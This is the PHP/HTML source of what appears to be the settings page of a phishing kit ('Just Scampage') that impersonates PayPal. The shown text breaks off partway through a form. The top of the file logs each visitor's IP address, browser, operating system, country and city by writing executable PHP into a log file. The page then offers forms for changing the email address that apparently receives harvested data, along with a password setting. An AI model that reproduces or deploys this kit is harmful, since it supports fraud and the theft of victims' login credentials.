<?php
include('../settings.php');
include_once '../detect.php';
include_once '../detect_os.php';

date_default_timezone_set("Asia/Bangkok");
$uriSegments = explode("/", parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
$lastUriSegment = array_pop($uriSegments);

$dt = date("l, F j Y h:i:s A");
$dt1 = strtotime(date("Y-m-d H:i:s"));

$msg = "<?php ".'$start = '.'"'.$dt1.'"; '." ".'$end = '.'strtotime(date("Y-m-d H:i:s"))'."; ".' '." echo '<font color=blue>PANEL</font> > ".$ip.", ".$user_browser.", ".$user_os.", ".$nama_negara.", ".$kota.", ".date('Y-m-d').", <font color=red>'; ".' echo round(abs($end - $start) / 60,0). " minute ago </font><br/>"; ?>'."
";

$file=fopen("../visitor_log.php","a");
fwrite($file, $msg);
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!-- Meta, title, CSS, favicons, etc. -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Just Scampage | Settings</title>

    <!-- Bootstrap -->
    <link href="assets/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <!-- NProgress -->
    <link href="assets/nprogress/nprogress.css" rel="stylesheet">
    <!-- iCheck -->
    <link href="assets/iCheck/skins/flat/green.css" rel="stylesheet">

    <!-- bootstrap-progressbar -->
    <link href="assets/bootstrap-progressbar/css/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet">
    <!-- JQVMap -->
    <link href="assets/jqvmap/dist/jqvmap.min.css" rel="stylesheet"/>
    <!-- bootstrap-daterangepicker -->
    <link href="assets/bootstrap-daterangepicker/daterangepicker.css" rel="stylesheet">

    <!-- Custom Theme Style -->
    <link href="build/css/custom.min.css" rel="stylesheet">
  </head>


  <body style="background-color: #000000;"  class="nav-md">
    <div class="container body">
      <div class="main_container">
        <div class="col-md-3 left_col">
          <div style="background-color: #000000;"  class="left_col scroll-view">
            <div style="background-color: #000000;" class="navbar nav_title" style="border: 0;">
              <a href="dashboard.php" class="site_title"><span style="color: lime;">Admin Panel</span></a>
            </div>

            <div class="clearfix"></div>

            <!-- menu profile quick info -->
            <div style="background-color: #000000;" class="profile clearfix">
              <div class="profile_pic">
                <img src="https://sukawu.com//assets/images/student/user.png" alt="..." class="img-circle profile_img">
              </div>
              <div class="profile_info">
                <span style="color: lime;">Welcome,</span>
                <h2 style="color: lime;">Admin</h2>
              </div>
            </div>
            <!-- /menu profile quick info -->

            <br />

            <!-- sidebar menu -->
            <div style="background-color: #000000;" id="sidebar-menu" class="main_menu_side hidden-print main_menu">
              <div class="menu_section">
           
                <ul class="nav side-menu">
                  <li><a href="dashboard.php"><i class="fa fa-home"></i><span style="color: lime;">Dashboard</span></a></li>
                  <li><a href="setting.php"><i class="fa fa-users"></i><span style="color: lime;">Pengaturan</span></a></li>
                </ul>
              </div>
            </div>
            <div style="background-color: #000000;" class="sidebar-footer hidden-small">
              <a style="background-color: #000000;"  data-toggle="tooltip" data-placement="top" title="Logout">
                <span class="glyphicon glyphicon-off" aria-hidden="true"></span>
              </a>
      
            </div>
            <!-- /menu footer buttons -->
          </div>
        </div>
        <!-- top navigation -->
        <div class="top_nav">
          <div style="background-color: #000000;" class="nav_menu">
            <nav>
              <div class="nav toggle">
                <a id="menu_toggle"><i class="fa fa-bars"></i></a>
              </div>

              <ul class="nav navbar-nav navbar-right">
                <li class="">
                  <a href="javascript:;" class="user-profile dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                    <img src="https://www.freepnglogos.com/uploads/paypal-logo-png-7.png" alt="">
                  </a>
                </li>
              </ul>
            </nav>
          </div>
        </div>
        <!-- /top navigation -->

        <!-- page content -->
        <div class="right_col" role="main">
          <!-- top tiles -->
          <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">
              <div class="x_panel">
                <div class="x_title">
                <center>  <h2 style="color: #000000;">Pengaturan</h2></center>
                  <ul class="nav navbar-right panel_toolbox">
                    <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                    </li>
                    <li><a class="close-link"><i class="fa fa-close"></i></a>
                    </li>
                  </ul>
                  <div class="clearfix"></div>
                </div>
                <div class="x_content">
                 <table width="90%" align="center">
    <tr>
      <td width="45" align="center"><h5><strong style="color: #000000;">
          <img src="data:image/png;base64,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"></strong></h5></td>
    </tr>
  </table>
  <table align="center" width="90%">
 
          <tr>
            <form method="POST">
              <td align="center">
                <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}" type="text" class="form-control-sm" size="30" name="txt_oldemail" value="<?php echo $pais_email; ?>" required=required readonly="">
              </td>
              <td align="center">
            <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}" type="text" size="30" name="txt_newemail" value"" placeholder="yourmail@domain.com" required=required>
              </td>
              <td align="center" colspan="2">
                <input style="box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    padding: 3%;
    background: #43d1af;
    border-bottom: 2px solid #30c29e;
    border-top-style: none;
    border-right-style: none;
    border-left-style: none;
    color: #fff;
    font-size: 14px;
}" type="submit" class="btn btn-info btn-sm" name="change_email" value="Change Email">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}"  type="text" class="form-control-sm" size="15" name="txt_oldpassword" value="<?php echo $pais_minpass; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
